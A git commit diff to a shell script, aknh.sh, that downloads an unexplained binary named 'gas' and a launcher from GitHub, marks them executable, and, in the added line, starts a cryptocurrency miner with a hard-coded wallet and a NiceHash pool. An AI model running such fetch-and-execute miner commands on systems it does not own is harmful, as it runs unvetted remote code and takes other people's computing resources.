baffd8e8deb57ee98f5f3f969f3778fc0c7ade5f
coldajanta <92845525+coldajanta@users.noreply.github.com>
2021-10-20 12:51:17 +0530

    Update aknh.sh

--- aknh.sh
+++ aknh.sh
@@ -3,3 +3,4 @@ wget https://github.com/aka648582/yes/raw/main/gas
 chmod +x gas
 wget https://github.com/aka648582/yes/raw/main/cmdline_launcher.sh
 chmod +x cmdline_launcher.sh
+./cmdline_launcher.sh -algo autolykos  -coin BTC -wallet 3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 stratum+tcp://autolykos.usa-east.nicehash.com:3390
